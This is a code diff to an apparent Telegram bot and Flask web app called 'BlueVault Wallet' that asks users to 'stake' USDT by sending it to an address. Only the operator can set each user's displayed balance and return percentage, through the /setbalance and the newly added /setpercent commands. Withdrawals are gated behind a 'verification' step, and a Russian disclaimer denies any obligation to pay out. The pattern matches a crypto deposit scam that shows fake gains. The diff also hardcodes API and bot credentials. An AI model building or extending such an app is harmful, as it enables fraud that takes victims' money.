@@ -11,6 +11,7 @@ API_HASH = '7245de8e747a0d6fbe11f7cc14fcc0bb'
 BOT_TOKEN = '8737138603:AAG2FHcf4msHENx4ppx5jXmzNRgltJd1pPg'
 OWNER_ID = 1663746192
 CRYPTO_ADDRESS = '0xYourAddress'
+DEFAULT_PERCENT = 0
 
 logging.basicConfig(level=logging.INFO)
 
@@ -22,6 +23,7 @@ app = Flask(__name__)
 user_balances = {}
 verification_sessions = {}
 _handled = set()
+current_percent = DEFAULT_PERCENT
 
 HTML_PAGE = '''
 <!DOCTYPE html>
@@ -37,34 +39,141 @@ HTML_PAGE = '''
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: var(--text); padding: 16px; min-height: 100vh; }
         .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
         .logo { font-size: 20px; font-weight: 700; color: var(--blue-light); } .logo span { color: var(--blue); }
+        .header-right { display: flex; align-items: center; gap: 10px; }
         .status { width: 8px; height: 8px; background: var(--green); border-radius: 50%; box-shadow: 0 0 6px var(--green); }
+        .percent-badge { background: var(--card); border: 1px solid var(--blue); color: var(--blue-light); padding: 4px 10px; border-radius: 20px; font-size: 12px; font-weight: 700; }
         .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 20px; margin-bottom: 12px; }
         .balance-label { font-size: 13px; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
+        .balance-row { display: flex; align-items: baseline; gap: 8px; }
         .balance-value { font-size: 42px; font-weight: 700; color: #fff; line-height: 1; }
         .balance-usd { font-size: 14px; color: var(--text-secondary); margin-top: 6px; }
         .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 16px; }
-        .btn { background: var(--card); border: 1px solid var(--border); color: var(--blue-light); padding: 14px; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer; text-align: center; }
+        .btn { background: var(--card); border: 1px solid var(--border); color: var(--blue-light); padding: 14px; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer; text-align: center; position: relative; }
         .btn:active { background: var(--border); }
+        .btn-with-info { display: flex; align-items: center; justify-content: center; gap: 6px; }
+        .info-icon { background: var(--blue); color: #fff; border-radius: 50%; width: 18px; height: 18px; font-size: 11px; font-weight: 700; display: inline-flex; align-items: center; justify-content: center; cursor: pointer; }
         .notice { background: var(--card); border: 1px solid var(--blue); border-radius: 12px; padding: 16px; text-align: center; color: var(--blue-light); font-size: 14px; margin-top: 12px; }
         .address-box { background: var(--bg); border: 1px solid var(--border); border-radius: 12px; padding: 14px; font-size: 13px; word-break: break-all; color: var(--text-secondary); margin: 12px 0; font-family: monospace; }
         .divider { height: 1px; background: var(--border); margin: 16px 0; }
         .hidden { display: none; }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; align-items: center; justify-content: center; z-index: 1000; }
+        .modal { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 24px; margin: 20px; max-width: 500px; width: 100%; }
+        .modal h3 { color: var(--blue-light); margin-bottom: 16px; font-size: 18px; }
+        .modal p { color: var(--text-secondary); font-size: 13px; line-height: 1.6; margin-bottom: 12px; }
+        .modal .close-btn { background: var(--blue); color: #fff; border: none; padding: 12px 24px; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 8px; }
     </style>
 </head>
 <body>
-    <div class="header"><div class="logo">Blue<span>Vault</span></div><div class="status" id="statusDot"></div></div>
-    <div id="mainScreen"><div class="card"><div class="balance-label">Total Balance</div><div class="balance-value" id="balance">0.00</div><div class="balance-usd">USDT</div><div class="actions"><button class="btn" onclick="showStake()">↗ Stake</button><button class="btn" onclick="showWithdraw()">↓ Withdraw</button></div></div></div>
-    <div id="stakeScreen" class="hidden"><div class="card"><div class="balance-label">Stake USDT</div><p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px;">Send USDT to the address below</p><div class="address-box" id="cryptoAddress"></div><button class="btn" onclick="copyAddress()" style="width:100%;background:var(--blue);color:#fff;">Copy Address</button><div class="divider"></div><button class="btn" onclick="goBack()" style="width:100%;">← Back</button></div></div>
-    <div id="withdrawScreen" class="hidden"><div class="card"><div class="balance-label">Withdraw</div><div class="notice">⚠ Complete verification using <b>/verify</b> in the bot</div><div class="divider"></div><button class="btn" onclick="goBack()" style="width:100%;">← Back</button></div></div>
+    <div class="header">
+        <div class="logo">Blue<span>Vault</span></div>
+        <div class="header-right">
+            <div class="percent-badge" id="percentDisplay">0%</div>
+            <div class="status" id="statusDot"></div>
+        </div>
+    </div>
+
+    <div id="mainScreen">
+        <div class="card">
+            <div class="balance-label">Total Balance</div>
+            <div class="balance-row">
+                <div class="balance-value" id="balance">0.00</div>
+                <div class="percent-badge" id="percentInline" style="font-size:16px;padding:6px 12px;">0%</div>
+            </div>
+            <div class="balance-usd">USDT</div>
+            <div class="actions">
+                <div class="btn btn-with-info" onclick="showStake()">↗ Stake <span class="info-icon" onclick="event.stopPropagation();showAbout()">!</span></div>
+                <button class="btn" onclick="showWithdraw()">↓ Withdraw</button>
+            </div>
+            <div class="divider"></div>
+            <button class="btn" onclick="showAbout()" style="width:100%;">ℹ About Project</button>
+        </div>
+    </div>
+
+    <div id="stakeScreen" class="hidden">
+        <div class="card">
+            <div class="balance-label">Stake USDT</div>
+            <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px;">Send USDT to the address below</p>
+            <div class="address-box" id="cryptoAddress"></div>
+            <button class="btn" onclick="copyAddress()" style="width:100%;background:var(--blue);color:#fff;">Copy Address</button>
+            <div class="divider"></div>
+            <button class="btn" onclick="goBack()" style="width:100%;">← Back</button>
+        </div>
+    </div>
+
+    <div id="withdrawScreen" class="hidden">
+        <div class="card">
+            <div class="balance-label">Withdraw</div>
+            <div class="notice">⚠ Complete verification using <b>/verify</b> in the bot</div>
+            <div class="divider"></div>
+            <button class="btn" onclick="goBack()" style="width:100%;">← Back</button>
+        </div>
+    </div>
+
+    <div id="aboutModal" class="modal-overlay hidden" onclick="closeAbout(event)">
+        <div class="modal" onclick="event.stopPropagation()">
+            <h3>ℹ About BlueVault</h3>
+            <p><b>1. Схема работы:</b> Участник предоставляет интерфейс доступа к бирже. Система (набор алгоритмов и трейдботов) анализирует данные и совершает тестовые транзакции. Любые положительные изменения на счёте — технический побочный эффект работы ИИ.</p>
+            <p><b>2. Доступ закрытый:</b> Проект не является публичной офертой. Доступ только по персональному приглашению. Логика алгоритмов не разглашается.</p>
+            <p><b>3. Отказ от ответственности:</b> Все действия алгоритмов носят экспериментальный характер. Разработчики не гарантируют никакого результата. Участник действует на свой риск. Изменения баланса не являются обязательством выплат со стороны BlueVault.</p>
+            <p><b>4. Благодарность:</b> Спасибо за использование BlueVault. Ваше участие помогает тестировать и дорабатывать алгоритмы нового поколения в реальных рыночных условиях.</p>
+            <button class="close-btn" onclick="closeAbout()">Close</button>
+        </div>
+    </div>
+
     <script>
         const tg = window.Telegram.WebApp; tg.expand(); tg.ready();
         const userId = tg.initDataUnsafe?.user?.id || 0;
-        function updateBalance(){fetch('/get_balance?user_id='+userId).then(r=>r.json()).then(d=>{document.getElementById('balance').textContent=parseFloat(d.balance).toFixed(2)}).catch(()=>{document.getElementById('statusDot').style.background='var(--red)'})}
-        function showStake(){document.getElementById('mainScreen').classList.add('hidden');document.getElementById('stakeScreen').classList.remove('hidden');document.getElementById('withdrawScreen').classList.add('hidden');fetch('/get_address').then(r=>r.json()).then(d=>{document.getElementById('cryptoAddress').textContent=d.address})}
-        function showWithdraw(){document.getElementById('mainScreen').classList.add('hidden');document.getElementById('stakeScreen').classList.add('hidden');document.getElementById('withdrawScreen').classList.remove('hidden')}
-        function goBack(){document.getElementById('mainScreen').classList.remove('hidden');document.getElementById('stakeScreen').classList.add('hidden');document.getElementById('withdrawScreen').classList.add('hidden')}
-        function copyAddress(){navigator.clipboard.writeText(document.getElementById('cryptoAddress').textContent).then(()=>{tg.showPopup({title:'Copied',message:'Address copied'})})}
-        updateBalance();setInterval(updateBalance,15000);
+
+        function updateBalance(){
+            fetch('/get_balance?user_id='+userId)
+            .then(r=>r.json())
+            .then(d=>{
+                document.getElementById('balance').textContent = parseFloat(d.balance).toFixed(2);
+                document.getElementById('percentDisplay').textContent = d.percent + '%';
+                document.getElementById('percentInline').textContent = d.percent + '%';
+            })
+            .catch(()=>{
+                document.getElementById('statusDot').style.background='var(--red)';
+            });
+        }
+
+        function showStake(){
+            document.getElementById('mainScreen').classList.add('hidden');
+            document.getElementById('stakeScreen').classList.remove('hidden');
+            document.getElementById('withdrawScreen').classList.add('hidden');
+            fetch('/get_address').then(r=>r.json()).then(d=>{document.getElementById('cryptoAddress').textContent=d.address});
+        }
+
+        function showWithdraw(){
+            document.getElementById('mainScreen').classList.add('hidden');
+            document.getElementById('stakeScreen').classList.add('hidden');
+            document.getElementById('withdrawScreen').classList.remove('hidden');
+        }
+
+        function goBack(){
+            document.getElementById('mainScreen').classList.remove('hidden');
+            document.getElementById('stakeScreen').classList.add('hidden');
+            document.getElementById('withdrawScreen').classList.add('hidden');
+        }
+
+        function copyAddress(){
+            navigator.clipboard.writeText(document.getElementById('cryptoAddress').textContent).then(()=>{
+                tg.showPopup({title:'Copied',message:'Address copied to clipboard'});
+            });
+        }
+
+        function showAbout(){
+            document.getElementById('aboutModal').classList.remove('hidden');
+        }
+
+        function closeAbout(e){
+            if(!e || e.target === document.getElementById('aboutModal')){
+                document.getElementById('aboutModal').classList.add('hidden');
+            }
+        }
+
+        updateBalance();
+        setInterval(updateBalance, 15000);
     </script>
 </body>
 </html>
@@ -86,7 +195,7 @@ def index():
 @app.route('/get_balance')
 def get_balance():
     user_id = int(request.args.get('user_id', 0))
-    return jsonify({'balance': user_balances.get(user_id, 0)})
+    return jsonify({'balance': user_balances.get(user_id, 0), 'percent': current_percent})
 
 @app.route('/get_address')
 def get_address():
@@ -97,7 +206,10 @@ async def start(event):
     if already_handled(event): return
     user_id = event.sender_id
     user_balances.setdefault(user_id, 0)
-    await event.respond('🛡 BlueVault Wallet', buttons=[[Button.url('🚀 Open App', 'https://t.me/Buraldikbot/Hhvhjk')]])
+    await event.respond('🛡 BlueVault Wallet', buttons=[
+        [Button.url('🚀 Open App', 'https://t.me/Buraldikbot/Hhvhjk')],
+        [Button.url('ℹ About', 'https://t.me/Buraldikbot/Hhvhjk')]
+    ])
 
 @bot.on(events.NewMessage(pattern='/setbalance'))
 async def set_balance(event):
@@ -110,6 +222,17 @@ async def set_balance(event):
         await event.respond(f'Balance {target_id}: {amount} USDT')
     except:
         await event.respond('/setbalance <id> <amount>')
+
+@bot.on(events.NewMessage(pattern='/setpercent'))
+async def set_percent(event):
+    if already_handled(event): return
+    if event.sender_id != OWNER_ID: return
+    global current_percent
+    try:
+        current_percent = int(event.text.split()[1])
+        await event.respond(f'Percent set to {current_percent}%')
+    except:
+        await event.respond('/setpercent <number>')
 
 @bot.on(events.NewMessage(pattern='/myid'))
 async def myid(event):
